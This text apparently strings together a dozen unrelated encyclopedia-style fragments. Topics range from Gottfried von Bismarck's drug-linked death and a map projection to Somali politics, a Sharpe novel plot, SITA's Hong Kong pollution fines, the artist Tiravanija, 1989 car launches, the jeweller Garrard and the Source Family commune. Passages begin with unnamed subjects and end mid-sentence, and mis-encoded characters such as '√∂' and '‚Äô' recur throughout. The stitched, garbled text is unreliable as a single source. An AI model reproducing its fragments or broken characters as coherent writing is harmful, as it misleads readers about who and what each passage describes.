Von Bismarck was noted for his dissolute lifestyle, and his homes were linked to two deaths from narcotics, although he was not found responsible for either. He died of a cocaine overdose in 2007. Family Born in Uccle, Belgium, Gottfried von Bismarck-Sch√∂nhausen was the second son of Ferdinand, Prince von Bismarck and grandson of Otto, Prince von Bismarck, a diplomat at Germany's embassy in London until a feud with Third Reich foreign minister Joachim von Ribbentrop. He was the great-great-grandson of German Chancellor Otto von Bismarck. Bismarck's great uncle and namesake, Count Gottfried, was a Nazi official who may have been part of the 20 July plot to assassinate Adolf Hitler. His younger sister, Vanessa Gr√§fin von Bismarck-Sch√∂nhausen (born 26 March 1971, Hamburg, (Germany)) is a public relations agent in the United States. His elder brother Carl-Eduard Graf von Bismarck-Sch√∂nhausen (born 1961) was a member (MP) of the German Bundestag. Early life and education Bismarck grew up primarily in his family's ancestral estate near Hamburg. He attended school in Germany and Switzerland and had a brief internship at the New York Stock Exchange before enrolling at Christ Church, Oxford University, where he studied Philosophy, Politics and Economics (PPE) earning a third class honours degree. He was a member of the exclusive Piers Gaveston Society, \\"noted for its predilection for rubber wear and whips, which he embellished with his androgynous apparel and lipstick\\", as well as the prohibitively expensive Bullingdon Club, known for its members' wealth and destructive binges, alongside friends like Darius Guppy. Confessing that he did not enjoy the typical social life in Oxford, he and his friends would escape to the more wild, fashionable parties in London on the weekends or whenever possible. He reportedly drank heavily at night and took amphetamines by day to concentrate on his studies. Narcotics incident at university The death of heiress Olivia Channon, the daughter of the English Conservative politician Paul Channon, would have a huge and devastating effect on Bismarck‚Äôs life. She was found dead from a heroin overdose in his rooms at Christ Church in 1986, although he was not present at the time. Bismarck was charged with drug possession and fined ¬£80 at an Oxford Magistrates Court. The shadow of Channon's death haunted him, and he was said to have \\"wept like a child\\" at her funeral. His father, Prince Ferdinand, recalled him to Germany for treatment at a private clinic, it was said he left Oxford so quickly that a family servant had to settle his bills with public houses, tailors and restaurants. Business career After completion of his studies at a German university, where he wrote a doctoral thesis on the East German telephone system, Bismarck visited the family estate at Sch√∂nhausen, which was lost under communist rule in East Germany. This was a powerful personal experience for him. Later, after having spent some time in Los Angeles, he went to work as an executive for the now defunct Telemonde with the intent to raise capital from the stock market prior to its collapse in 2002. He returned to London soon after and became a promoter of holidays in Uzbekistan. He was a co- founding executive with AIM Partners, a London-based investment firm. Narcotics incident 2006 In August 2006, Anthony Casey, 41, fell 20 m (60 ft) from Graf von Bismarck's Chelsea flat and died. Bismarck was not arrested and the police said there were no drugs found in his flat. Nevertheless, the event re-awakened the so-called \\"curse\\" from the past, and triggered speculation from the tabloid press. An article in London's Daily Mail claimed that the incident occurred during a cocaine-fueled orgy. The coroner's report had found no alcohol in Casey's body, but did find a significant amount of cocaine. The accusation of a 'gay orgy' was officially denied by von Bismarck, though the coroner, Dr Paul Knapman, told The Guardian that a great deal of sexual paraphernalia was discovered in the flat, including sex toys and lubricants. \\"In common parlance, in the early hours of the morning, there was a gay orgy going on\\", Dr. Knapman told the newspaper. \\"Nevertheless, this was conducted by consenting males in private.\\" Death In early 2007 Bismarck discreetly moved in with an old friend on Portobello Road, Notting Hill. He had been heard to say that he was deeply saddened his life had brought so much shame upon his family. Friends were relieved he was making such a concerted effort to clean up his life and that he was being helped to start afresh in a new home environment. On 2 July 2007 he was found dead in his almost empty ¬£5 million flat, which was in the process of being sold. He was 44 years old. An inquest into the circumstances was opened on 6 July 2007. Sebastien Lucas, the pathologist who carried out the postmortem, said that Bismarck had been injecting cocaine on an hourly basis on the day before his death, and that Bismarck's body contained the highest level of cocaine that he had ever seen, as well as morphine; he also had liver damage, Hepatitis B, Hepatitis C, and HIV.

The two points are Rome, Italy and Luoyang, China. The two-point equidistant projection is a map projection first described by Hans Maurer in 1919. It is a generalization of the much simpler azimuthal equidistant projection. In this two-point form, two locus points are chosen by the mapmaker to configure the projection. Distances from the two loci to any other point on the map are correct: that is, they scale to the distances of the same points on the sphere. The projection has been used for all maps of the Asian continent by the National Geographic Society atlases since 1959, though its purpose in that case was to reduce distortion throughout Asia rather than to measure from the two loci. The projection sometimes appears in maps of air routes. The Chamberlin trimetric projection is a logical extension of the two-point idea to three points, but the three-point case only yields a sort of minimum error for distances from the three loci, rather than yielding correct distances. Tobler extended this idea to arbitrarily large number of loci by using automated root-mean-square minimization techniques rather than using closed-form formulae.

Gacmadheere pursued his secondary education in Syria, and then moved on to Iraq and Romania, where he eventually obtained Bachelor's, Master's and PHD degrees in the fields of Economics and Agriculture. Besides Somali, he speaks Arabic, Italian, Romanian and English. Gacmadheere began his professional career as a trader before moving on to politics. In the late 1980s, he was imprisoned by Somalia's then ruling military government for dissent. He was reportedly a leader of Mogadishu's civil society groups, and opposed the armed factions led by warlords as well as the sectarian clan violence that had engulfed the nation after the collapse of the central government. Transitional National Government (TNG)  Gacmadheere contended in the 2000 presidential elections held in Djibouti, but eventually lost to Abdikassim Salat Hassan. He was also for a brief period a political advisor to Ali Khalif Galaid who at the time was Somalia's Prime Minister. Transitional Federal Government (TFG) Gacmadheere was initially appointed as Minister of Public Works and Housing. However, on February 7, 2007, his portfolio was swapped with that of Interior Minister Hussein Mohamed Farah Aidid, making him the new Interior Minister. On February 15, he blamed instability in Somalia on the \\"terrorist attacks\\" conducted by members of the Islamic Courts Union (ICU), a movement which declared itself the Popular Resistance Movement (PRM). He announced that checkpoints were established by Somali and Ethiopian forces to conduct searches for the Islamists.

Life The origins of Xeniya Ivanovna has been disputed by genealogists for centuries. It is currently accepted that her surname was Shestova (–®–µ—Å—Ç–æ–≤–∞; rather than Shastunova, as was previously believed) and that her grandfather was Timofey Gryaznoy, a rich landowner from Uglich. During Boris Godunov's repression of the Romanovs, she was forced to take the veil, changing her name to Martha (Russian: Marfa). After several years of exile at Tolvuyskiy pogost, she settled with her son in Kostroma. It was there that the ambassadors arrived to inform Mikhail about his election to the Russian throne in 1613. As the previous tsars had been either killed or disgraced, Marfa at first declined to bless her son and let him go to Moscow. During the first years of his reign, Marfa (or the \\"great nun\\" as she came to be known) exerted great influence on her moribund and listless son. She placed her relatives, the Saltykovs, at the important posts in the government, leading to widespread corruption. The return of her husband from Poland in 1619 put an end to their (and her own) influence at court. She died on 27 January 1631 and was buried in Novospassky Monastery.

The peace of 1814 formally ends the Peninsular War, but it does not end all hostilities among individuals. Plot summary In 1814, Richard Sharpe and his second wife, Jane, quarrel over Sharpe's imminent duel with Captain Bampfylde, resulting from the latter's cowardice in the previous novel, Sharpe's Siege. Just in case, Sharpe grants her power of attorney over the considerable sum of money he has lodged with his prize agent in London. Sharpe fights the duel, wounding Bampfylde in the buttocks, and sends Jane to England with instructions to purchase a country home in Dorset, even though she makes it clear she wants to live in London. Sharpe takes part in the Battle of Toulouse. Shortly afterwards, however, he learns that the war has already ended, and Napoleon has been defeated. Sharpe, Harper and Frederickson go to Bordeaux to await transport to England. There he learns that Jane has closed out his account, withdrawing almost ¬£18,000. Sharpe and Frederickson are arrested in Bordeaux, accused of stealing Napoleon's treasury, which has been concealed at Teste de Buch, the fortress they had captured in the previous novel. A witness statement by Napoleon's spymaster, Pierre Ducos, an old, bitter enemy of Sharpe's, reveals who is responsible for the false allegation. Sharpe and Frederickson realize that they need the testimony of the fort's French commander, Henri Lassan, to exonerate them, so with help from Harper and Captain Peter d'Alembord, the two men escape and set out to find Lassan. In London, ignoring Sharpe's instructions at the urging of a friend, Lady Spindacre, Jane takes a large and expensive town house in fashionable Cork Street. On hearing of her husband's arrest, she contacts Sharpe's former ally, Lord John Rossendale, but instead of using his influence on Sharpe's behalf, he becomes Jane's lover. Sharpe and Frederickson make their way to Lassan's ancestral home in Normandy, to which he has retired. They arrive shortly after assassins sent by Ducos (disguised as British riflemen) kill Lassan and his mother. Lassan's widowed sister, Lucille Castineau, shoots and nearly kills Sharpe, mistaking him for the killers. When she learns the truth, Lucille takes the two fugitives in and nurses Sharpe. Harper and d'Alembord return to England to contact Jane. Jane refuses to receive them, and has Harper horsewhipped. In Normandy, Frederickson grows attached to Lucille, and proposes to her, but is refused. He leaves for Paris to track down Ducos, leaving Sharpe to recover from his injuries. In his absence, Sharpe and Lucille become lovers. Harper returns and tells Sharpe about Jane, just as Frederickson sends word that Ducos has fled to Naples in Italy. The three men travel to Italy, while Lucille, now pregnant, writes to the French prosecutor to exonerate Sharpe. Her letter is passed to Napoleon, in exile on Elba, who dispatches General Calvet to Naples to retrieve his treasure. In Naples, Ducos assumes the identity of a Polish count, buys the protection of the local cardinal, and assembles a small personal force of guards to guard the treasure. Calvet and Sharpe form an alliance; Ducos will get the treasure, while Sharpe will take Ducos back and clear him and Frederickson. The combined force successfully infiltrate Ducos's villa, capturing the treasure and Ducos himself, but before they can leave, the cardinal's forces surround the villa. Sharpe loads a small cannon with gold coins and fires it among the Neapolitan troops. The ill-disciplined men break ranks to collect the coins, and allow the besieged company to escape by sea, taking Ducos and the remaining treasure with them. Ducos is executed by firing squad. Sharpe and Frederickson have a falling out when Frederickson learns of Sharpe's relationship with Lucille (whom Frederickson had fallen in love with). Harper, discharged from the army, goes home to Ireland with his Spanish wife and child. Sharpe returns to Lucille (with some of Napoleon's gold coins). Television adaptation The novel was adapted as the first episode of the fifth season of the Sharpe television series, introducing C√©cile Paoli as Lucille, seeing Alexis Denisof take over the role of Rossendale and guest starring John Benfield as Calvet, Connie Hyde as Lady Molly and Milton Johns as Hopkinson. The adaptation was basically faithful to the novel but lost many of the connections to Sharpe's Siege as a result of an original story, Sharpe's Mission, being placed between the adaptations: Instead of the duel with Bampfylde, Sharpe fights a similar duel with Colonel Wigram, the officer who later commands his court martial, for insulting him at Toulouse and Lucille's brother is not Lassan but Maillot, the officer in charge of Napoleon's treasure (with their mother omitted entirely). Nairn's role is given to Major-General Ross, an original recurring character in the series, and the character's fate changed so he is merely wounded. D'Alembord is also omitted and other characters have their names changed, with Lady Molly Spinacre becoming Lady Molly Hardcastle and Lucille's married name change from Castineau to Duberre. Frederickson learns of Sharpe and Lucille's relationship much earlier, before travelling to Naples, leaving them semi-reconciled at the end and Ducos' death is altered, with Sharpe shooting him from a distance as he tries to escape. Lucille's pregnancy was also left out, since the adaptation was followed by another original story, Sharpe's Justice, and ends with Sharpe and Harper saying goodbye to Lucille and returning to England.

Following the merger of Suez company and Gaz de France in 2008, Suez Environnement became a listed group on the New York Stock Exchange, Brussels Stock Exchange and the Paris Stock Exchange. SITA is a significant part of the Suez Environnement business, which now as a waste management and water treatment specialist is fully focused on sustainable development.

Sita's services include business and residential waste disposal, street cleansing, landfill engineering, civic amenity site management and energy from waste.Sita background, www.sita.co.uk, Accessed 24.11.06 History SITA was created in 1918 to modernise domestic waste collection in Paris and to cope with the rapid rise in the volume of domestic waste generated by Parisians. SITA was taken over by Soci√©t√© Lyonnaise des Eaux et de l'√âclairage in 1971 and became a part of La Compagnie de SUEZ. The aim of the acquisition was to allow SITA to respond to the changes taking place in the market at the time. New facilities were built to better manage the landfill process and to allow SITA to incinerate domestic waste. New markets were developed with local authorities, such as selective glass collection schemes and the collection and treatment of clinical waste from hospitals. In 1997, La Compagnie de Suez and Lyonnaise des Eaux merged to form the new group, Suez Lyonnaise des Eaux and later Suez Environnement was created. Following the merger, the group gradually began to focus on two main areas: energy and environment developing new technologies for the treatment of waste, recycling and the production of renewable energy. Hong Kong division SITA Waste Services Limited holds the aftercare contracts for seven closed Hong Kong landfills, namely: Tseung Kwan O Phase I, Tseung Kwan O Phase II & III, Gin Drinkers' Bay, Ngau Tam Mei, Siu Lang Shui, Ma Tso Lung, and Pillar Point Valley. They also manage two operating landfills, the North East New Territories Landfill (NENT) and the West New Territories Landfill (WENT), as well as various refuse transfer stations around the territory. The company was formerly known as Swire SITA Waste Services Limited. Swire sold its interest in 2008 and the company name was changed to its present form in 2009. In 2012 two former directors of Swire SITA were jailed for bribing Macao's former secretary for transport and public works Ao Man Long. The sentencing judge said that to some extent the pair were \\"victims\\" as it was Ao who initiated the bribe. A 2016 investigation by Hong Kong's Environmental Protection Department (EPD) found that SITA failed to meet their contractual obligation to maintain a minimum temperature of 1,000¬∞C for the flaring of landfill gas in the leachate treatment plant at the closed Pillar Point Valley Landfill, in an attempt to save fuel expenditure. As a result, up to 800 tonnes of polluted water (landfill leachate) was discharged into the sea per day from November 2015 to January 2016. The EPD consequently deducted HK$200,000 from the monthly payment to SITA. The EPD also set up a special investigation team to look into alleged malpractice by SITA. By mid-November 2016, the department had deducted a total of $3.3 million from the contract payments to SITA on the grounds that the leachate treatment plant failed to meet standards. Late in 2016 the EPD once again prosecuted SITA under the Water Pollution Control Ordinance. The department found that, from May to June 2016, SITA repeatedly exceeded the polluted water discharge limit specified in the licence. The EPD prosecuted SITA under 16 offences of the Water Pollution Control (General) Regulations. In May 2017, SITA was convicted in the Fanling Magistrates‚Äô Courts of 20 offences and fined $200,000. The EPD deducted $5.5 million in operation payments to SITA for the Pillar Point contract.

Work Artistic projects According to art historian Rochelle Steiner, Tiravanija's work ‚Äúis fundamentally about bringing people together.‚Äù The artist's installations of the early-1990s involved cooking meals for gallery-goers. In one of his best-known series, begun with pad thai (1990) at the Paula Allen Gallery in New York, he rejected traditional art objects altogether and instead cooked and served food for exhibition visitors. He recreated the installation in 2007 at the David Zwirner gallery in Chelsea using the original elements and renaming the work untitled (Free/Still).Carol Vogel (October 27, 2011), Meals as Art at MoMA New York Times. In 1995 he presented a similar untitled work at the Carnegie International exhibition at the Carnegie Museum of Art, where he included wall text that presented written instructions for cooking South-east Asian green curry, which was then prepared for visitors. As a prelude to the opening of La Triennale 2012, Tiravanija was invited to transform the main nave of the Grand Palais into a festive, large- scale, twelve-hour banquet composed of a single meal of Tom Kha soup (Soup/No Soup, 2012). His exhibitions are often based on interaction and exchange among participants. Some viewers, like the students who lived in Untitled 1999, a recreation of Tiravanija's East Village apartment, actually moved in for the duration of an exhibition. A 2005 solo show at Serpentine Gallery, London, featured two new, full-scale replicas of this apartment, complete with kitchen, bath, and bedroom.Rose Jennings (July 24, 2005), There's plenty of room for manoeuvre The Guardian. In other projects, he has bricked up the entrance to gallery spaces, rendering them impenetrable for the duration of the respective exhibition, and has painted the words \\" Ne Travaillez Jamais\\" on the wall, a phrase lifted from the May, 1968, protest riots in Paris. When Tiravanija does make objects, they are most often multiples and ephemera connected with exhibitions.Faye Hirsch (June 7, 2011), Rirkrit Tiravanija Art in America. Since the early 1990s, Tiravanija has published multiples in the form of backpacks, cooking utensils, and maps as part of his practice. These commonplace objects used for cooking or camping serve today as memories of the artist's earlier projects and also stimulate new interactions, whether physical or purely in the imagination. In Untitled 2008‚Äì2011 (the map of the land of feeling), Tiravanija presents a visual chronology of his life and work between 1988 and 2008, as told through the pages of his expansive passport.Print/Out, February 19 ‚Äì May 14, 2012 Museum of Modern Art, New York. In 1997 Tiravanija began an engagement with modernist architecture when he installed in the Museum of Modern Art's sculpture garden Untitled: 1997 (Glass House), a child-size version of Philip Johnson's Glass House (1949). Similarly, untitled 2002 (he promised) is an arena of activities ranging from DJ sessions to film screenings within a chrome and steel structure inspired by Rudolf M.

For Asile Flottant (2010), he constructed a sketch of Le Corbusier‚Äôs boat of the same name and inserted a section of it into a gallery. Le Corbusier‚Äôs barge was designed for the Salvation Army literally as a floating asylum meant to provide temporary overnight shelter for vagrants wandering the streets of Paris; Tiravanija‚Äôs barge, constructed in Chiang Mai, was to serve as a pavilion that houses both political T-shirts designed by the artist, and others that have been collected from all over the world.Rirkrit Tiravanija: Asile flottant, May 5 - June 17, 2010 Galerie Chantal Crousel, Paris. In 2004 the Solomon R. Guggenheim Museum in New York honoured Tiravanija with the Hugo Boss Prize and presented an exhibition of his work, which had more overtly political tones. Featured in this exhibition, Untitled 2005 (The Air Between the Chain-Link Fence and the Broken Bicycle Wheel) was an installation in which the artist addressed governmental control of popular media by installing a low-tech pirate television station within the museum, using a simple metal antenna and cables as broadcasting equipment, accompanied by a small wooden structure housing a television set and chairs. On the gallery walls Tiravanija featured the text of the US Constitution‚Äôs First Amendment (advocating freedom of speech), a history of radio and television communication in America, and simple directions for constructing low-tech broadcasting equipment. Tiravanija‚Äôs support of free speech is conveyed by his choice to broadcast the low-budget film Punishment Park (1971), a documentary on the suppression of Vietnam War protests.

Tiravanija's second feature film, Lung Neaw Visits His Neighbours was released in 2011. The film was shown at the Orizzonti section of the 68th Venice International Film Festival. The documentary features a retired farmer that lives in a tranquil village in Chiang Mai, far from the recent political turmoil in Bangkok. At a moment when many people are demanding equality, opportunity, and democracy, we see in Lung Neaw an existence marked by compassion for his environment and his fellow villagers.

The automotive industry designs, develops, manufactures, markets, and sells motor vehicles. United Kingdom The new Ford Fiesta used the same floorplan as the original 1976 version, but with a new bodyshell which, for the first time, was available with five doors as well as three. The range included a 1.0 unit and a 1.6 8-valve CVH engine which fit under the bonnet of the XR2i, which had fuel injection. There was also a 1.4 Ghia model, sold only as a 5-door with electric front windows and the option of anti-lock brakes. The Escort received a minor update with a new badge at the rear and some trim revisions and enjoyed its best-ever sales year in the UK with over 180,000 sold. Rover Group plc launched a new 200 Series in October which unlike the previous four-door saloon car, was a hatchback available with five doors with a three door version to follow later. The Rover 400 Series saloon would launch in April 1990, effectively replacing the saloon version of the previous 200 Series. The 200 Series was powered by a range of new K-Series petrol engines ranging from 1.4 to 2.0 litres. There was also a 1.8 turbo-diesel. The hatchback was marketed as a Ford Escort rival, but the slightly larger saloon was competing against cars such as the Ford Sierra and Vauxhall Cavalier. Following the launch of these new model ranges, Maestro and Montego production was reduced, while a new version of the Metro was planned for sale in 1990. The long- running Mini celebrated its 30th year in production. Jaguar became part of the Ford Motor Company, five years after being privatised in its sell-off from British Leyland. Updated versions of the Jaguar XJS coupe and convertible were planned. Vauxhall reentered the coupe market, eight years after the Cavalier Sport Hatch went out of production. The new entrant in this sector was the Calibra, which was based on the front-wheel drive chassis of the latest Cavalier, and used the Cavalier's 2.0 8-valve and 16-valve engines while the MK2 Astra received a minor facelift with the saloon version now called the Astra Belmont. France Renault launched its R19 range, a three- and five- door hatchback aimed to compete with cars such as the Ford Escort and Volkswagen Golf. It succeeded the R9 and R11 ranges, and was powered by 1.4 and 1.7 petrol engines as well as a 1.9 diesel. Peugeot launched the 605 range, a four-door saloon with 2.0 four-cylinder and 2.9 V6 petrol engines as well as a 2.1 turbo-diesel. Citroen replaced its CX range with the XM featuring self-levelling oleo-pneumatic suspension. Its engines were all sourced from the Peugeot 605, but unlike the Peugeot, the XM was available as an estate as well as a hatchback although it wouldn't launch until 1991 while the CX version continued until then. Germany Mercedes-Benz launched a new version of its SL sports car for the first time in 18 years, available with a 3.0 V6 or 5.0 V8 engine. BMW replaced the 13-year-old 6 Series with the new 850i. Italy The Fiat Regata saloon and \\"Weekend\\" estate ceased production, and were replaced by the Tipo-based Tempra saloon and \\"Station Wagon\\". It was powered by the same 1.6, 1.8 and 2.0 petrol engines which power the Tipo models, but offered a larger boot. The Station Wagon came with the option of seven seats. Lancia launched a new saloon version of the Delta - the Dedra - to replace the Prisma. It used the same engine and chassis as the hatchback, and was also available with a 2.0 turbo engine from the Delta Integrale. Japan Mazda launch the new MX5 two-seater roadster. It offered a style similar to the 1968 Lotus Elan. Nissan launched a new 200SX 2+2 sports coupe powered by a 2.0 16-valve turbo engine, capable of nearly 140 mph.

History  Syrup16g formed in 1993 when Igarashi and drummer Nakahata Daiki met at vocational school in Sendai and decided to form a band. Shortly after, bassist Satou Motoaki and a short-lived vocalist joined the band. In 1996, the vocalist left and guitarist Igarashi (who had written the songs all along) took over vocal duties. From the release of their first 6 song demo EP in 1998 until 2001, the band built quite a name for themselves in the Sendai indie scene, attracting the attention of indie label Daizawa Records, the label also responsible for Condor44 and Tsubakiya Shijuusou. In 2001, Syrup's first album, Copy was released on Daizawa Records to critical acclaim, with the record-release show at Shimokitazawa's Club Que selling out. Tours of western Japan with Art-School and label-mates Condor44 followed shortly after, vaulting Syrup into the public eye. Their major label debut on Columbia, Coup D'√©tat, followed in 2002 along with shows with Bloodthirsty Butchers and Losalios. Shortly after the release of Coup D'√©tat, bassist Satoh parted ways with the band, and Studio Apes bassist Kitada Maki joined to replace him. For about 3 years, Syrup16g kept up a backbreaking pace of touring and studio work, consistently releasing more than one album a year and never failing to both tour in support of the albums and appear at major events such as the Rock in Japan Festival and the Fuji Rock Festival. In addition, they have released two live DVDs and a number of singles. In early 2006, Syrup16g scaled down their touring schedule to accommodate the schedules of the members' side projects, and no album release was planned. At a December 7, 2007 concert at NHK Hall, the band announced that it would dissolve following a final performance at Nippon Budokan on March 1, 2008. The announcement was confirmed on the band's official website. At June 27, 2014 it was reported that Syrup16g would return with a new album \\"Hurt\\" to be released on August 27.

The mount on the quarterdeck was later removed as it was unusable in heavy seas. The first four ships to be completed, including Blackwood, were fitted with two above-water twin mounts for anti-submarine homing torpedoes, but these were removed in the early 1960s. They were equipped with two triple-barrelled Limbo Mark 10 anti- submarine mortars. The Blackwood-class ships had the same sonar suite as the larger s where the Limbo mortars were controlled by three sonars, the Type 174 search set, Type 162 target-classification set and the Type 170 'pencil beam' targeting set to determine the bearing and depth of the target.Marriott, pp. 55, 66, 69 Construction and career Palliser was laid down at Alexander Stephen and Sons' Linthouse, Glasgow shipyard on 15 March 1955. She was launched on 10 May 1956 and completed on 13 December 1957.Friedman p. 330. On commissioning, Palliser joined the Fishery Protection Squadron, serving with the squadron until April 1967.Critchley p. 94. As such she took part in the Cod Wars of the late 1950s and 1960s. On 22 January 1971, Palliser was recommissioned into the 2nd Frigate Squadron based at Portland Harbour. In May 1973 she was paid off and laid up for disposal. In 1983 Palliser was to be scrapped at S Dean and Sons at Briton Ferry, Neath. Initial attempts to tow the frigate from Portsmouth were delayed by fog, and when on 9 February 1983, the tug Alnwick took Palliser in tow, Alnwick collided with Palliser, damaging the tug and forcing the two ships into Plymouth for repairs. When the tow recommenced, fog caused it to be stopped when the ships reached Swansea Bay, forcing the ships to miss the correct tide, causing a further delay of a week. When the ships finally reached Neath on 27 March 1983, Palliser ran aground before finally making it to the breakers.

Limited, formerly Asprey & Garrard Limited, designs and manufactures luxury jewellery and silver. George Wickes founded Garrard in London in 1735 and the brand is headquartered at Albemarle Street in Mayfair, London. Garrard also has a presence in a number of other locations globally. Garrard was the first official Crown Jeweller of the UK, charged with the upkeep of the British Crown Jewels, from 1843 to 2007, and was responsible for the creation of many tiaras and jewels still worn by the British royal family today. As well as jewellery, Garrard is known for having created some of the world's most illustrious sporting trophies, including the Americas Cup, the ICC Cricket World Cup Trophyhttp://www.dnaindia.com/sport/report-2015-icc-cricket-world-cup-trophy- to-visit-participating-countries-1999412 and a number of trophies for Royal Ascot in its role as Official Trophies and Silverware Supplier, which originally dates back to the first Gold Cup in 1842. History Victorian Silver-Gilt Salt Cellars by R. & S. Garrard. Hallmarked London, 1844 The company that was to become Garrard was founded by George Wickes (1698‚Äì1761), who entered his mark in Goldsmiths' Hall in 1722. Wickes set up business in Threadneedle Street in the City of London in 1722; the company moved to Panton Street off Haymarket in central London in 1735 as a goldsmith and provider of jewellery and other luxury items to aristocratic patrons. Wickes was an accomplished silversmith known for his work in the rococo style, and gained the patronage of Frederick, Prince of Wales. Two apprentices of Wickes, John Parker and Edward Wakelin, purchased the company following Wickes' retirement in 1760, replaced by John Wakelin and William Taylor in 1776. Following the death of William Taylor, Robert Garrard became a partner in the company in 1792. Garrard took sole control of the firm in 1802, with his sons Robert Garrard II, James and Sebastian succeeding him in running the company, trading as R., J., & S. Garrard (or Robert Garrard & Brothers) until James' retirement in 1835, when the company became R & S Garrard. The company remained in the hands of the Garrard family until the death of Sebastian Henry Garrard, great- grandson of Robert Garrard senior, in 1946. The name Garrard & Company Ltd was registered in 1909, and the company moved to new premises in Albemarle Street in central London in 1911. The America's Cup in neo-Mannerist style, 1848 In 1843, Queen Victoria appointed Garrard as the first ever official Crown Jewellers, leading to the production of numerous pieces of silverware and jewellery for the Royal Family, as well as the upkeep of the Crown Jewels. The company has dealt with a number of famous jewels, such as the Cullinan diamonds (including Cullinan I, \\"The Great Star of Africa\\"), and created such pieces as the Imperial Crown of India in 1911, the crown of Queen Mary for her coronation, and the Crown of Queen Elizabeth in 1937. In 1852, Garrard were given the responsibility of re-cutting the famous Koh-i-Noor diamond into a brilliant. In 1848 Garrard produced what is now referred to as the America's Cup, and is the oldest international sporting trophy. The Cup is an ornate sterling silver bottomless ewer originally awarded in 1851 by the Royal Yacht Squadron for a yacht race around the Isle of Wight in England, which was won by the schooner America. The trophy was renamed the 'America's Cup' after the yacht and was donated to the New York Yacht Club under the terms of the Deed of Gift, which made the cup available for perpetual international competition. Garrard amalgamated with The Goldsmiths and Silversmiths Company in 1952, when they closed their Albemarle workshops and moved premises to Regent Street. Garrard merged with the jewellery firm Asprey in 1998 to become Asprey & Garrard, moving from 112 Regent Street to premises on New Bond Street. The company demerged in 2002, with Garrard returning to the Albemarle Street site it first occupied in 1911. Garrard was acquired by the US private equity firm Yucaipa Companies in 2006, ending its partnership with Asprey. Jade Jagger was the creative director for the company from 2001 until being replaced by Stephen Webster in 2006. In 2012 Sara Prentice was appointed Creative Director of the brand.  Royal Warrant  On 15 July 2007, an announcement was made in the Court Circular, under Buckingham Palace, that Garrard & Co's services as crown jeweller were no longer required, with the reason cited being that it was simply 'time for a change' . This ended 166 years of Garrard's tenure as the inaugural British Royal Jeweller, although Garrard still holds a royal warrant from her son, the Prince of Wales.  Notable creations  More recently, Garrard made the sapphire engagement ring given by Charles, Prince of Wales, to Diana, Princess of Wales for their 1981 marriage. After the Death of Diana, Princess of Wales, the ring passed to her sons, and in 2011 it returned to the public eye as the engagement ring Prince William, Duke of Cambridge gave to his wife Catherine.; The distinctive cluster setting of this ring has become a signature of the House, and is still seen in the designs of the 1735 collection today. Garrard has created many other jewels that are worn by the British royal family, including the Girls of Great Britain and Ireland tiara which Queen Elizabeth II is seen wearing in the portrait featured on British currency. The Queen Mary Diamond Bandeau worn by Meghan Markle on the occasion of her marriage to HRH Prince Harry was created during Garrard‚Äôs time as crown jeweller. Garrard created the Premier League trophy. They also produced the original cubic zirconia prop-necklace of the Heart Of The Ocean for Titanic, as well as a similar necklace made with a sapphire and white diamonds which was worn by Celine Dion at the Oscars and later auctioned.  The Garrard Jubilee Sapphire  In 2018 The House of Garrard continued its rich legacy of sapphire jewellery creations with the unveiling of a 118.88ct royal blue Burmese sapphire presented in a brooch that features the House‚Äôs signature cluster setting. The jewel was named in honour of the 65th anniversary of Queen Elizabeth II‚Äôs coronation, a date traditionally marked by the gift of a sapphire, and pays tribute to the House‚Äôs role in remodelling the Imperial State Crown for the occasion.

It is at OS Grid Reference SD8857, near Airton, Calton and the A65. The village is north west of Skipton and east of Hellifield. At the 2011 census the population was less than 100, so the details are included in the civil parish of Airton. History The village is mentioned in the Domesday Book, when it was listed as Otreburne and belonging to Roger de Poitou. The name Otterburn derives from Otter Stream, which is the beck that flows through the village. Otterburn Beck, as the stream is now known, drains a catchment covering over and flows south east, covering a distance of before running into the River Aire at Bell Busk. The low-lying pasture land between Otterburn and Bell Busk along which the Otterburn Beck travels, has been known to flood dramatically, with a particular great flood in July 1881. Speight postulates that the land is prone to flooding as it was the site of a lake in ancient times. As flooding here can have a detrimental effect on the downstream locations, it has been suggested as a possible tree-planting area to help alleviate flooding in times of high rainfall. A Poll Tax in the 14th century determined that 14 families lived there with one being a blacksmith. It was also known as being the centrepoint of the Deanery of Craven. Historically, the land was divided between the monasteries of Fountains Abbey and Bolton Abbey. After the Dissolution of the Monasteries (), the land was leased to John Lambert of Calton for 60 years. In 1885, a large Neolithic barrow was discovered in a field to the south of the village. It was described as being perfectly circular and had a diameter of . The site is now a scheduled ancient monument. Otterburn was originally in the historic county of the West Riding of Yorkshire, but was moved into North Yorkshire when the boundary changes approved in 1973 came into effect in 1974. As the population of the village numbered less than 100 people at the 2011 census, the village was included in the civil parish of Airton for census purposes. However, in 2015, North Yorkshire County Council estimated the population of the village to number 40 people, a drop from 50 recorded at the 2011 census.

He founded a spiritual commune in the Hollywood Hills known as the Source Family. The Source Family was heavily influenced by the teachings of Yogi Bhajan and the astrological age of Aquarius. The Family practiced communal living in Southern California and later in Hawaii. He was also lead singer of the commune's experimental psychedelic rock band, Ya Ho Wha 13. Early life James Edward Baker was born on July 4, 1922, in Cincinnati, Ohio. Although he said he had been awarded the Silver Star while serving in the Marine Corps during World War Two, the Corps does not carry his name in its official listing of Silver Star recipients. Baker also said he had become an expert in jujutsu. He moved to California to become a Hollywood stuntman and was influenced by the Nature Boys, a Los Angeles-based group of beats who lived a natural lifestyle, maintained vegetarian diets, and lived \\"according to Nature's Laws\\".Bearman, Gary. YaHoWha 13 Interview July 2002. Baker also studied philosophy, religion and esoteric spiritual teachings, even becoming a Vedantic monk for a time. He later became a follower of Yogi Bhajan, a Sikh spiritual leader and teacher of Kundalini Yoga. In 1969, Baker founded the Source Restaurant on Los Angeles's Sunset Strip. The restaurant served organic vegetarian food, with such celebrity regulars as John Lennon, Julie Christie and Marlon Brando. Jim Baker had two other successful restaurants on Sunset Strip: the Aware Inn and the Old World.. Despite claims that he had fourteen different wives, he had only one legal wife as James Baker, Robin Popper, to whom he was married in 1970. They had a daughter together, Tau, born August 14, 1974. Robin said that at the time he was \\"a dirty old man on a lust trip\\". Source Family Baker left Yogi Bhajan in the late 1960s and created his own philosophy based on Western mystery tradition. Changing his name to Father Yod and Ya Ho Wha, Baker became the patriarch of a commune of young people, who considered him their spiritual father. The group, known as the Source Family, lived together in a Hollywood Hills mansion and was supported by the earnings of the Source Restaurant, which grossed $10,000 a day during its peak popularity.Harris, Kevin. Heavy Living: Father Yod and the Source Family Dusted Features. Some of the doctrines of the Source Family were kept secret; however, they generally adopted a way of life that promoted natural health, organic vegetarian diets, communal living and utopian ideals. Father Yod/Ya Ho Wha had a core communal group of 150 people living in 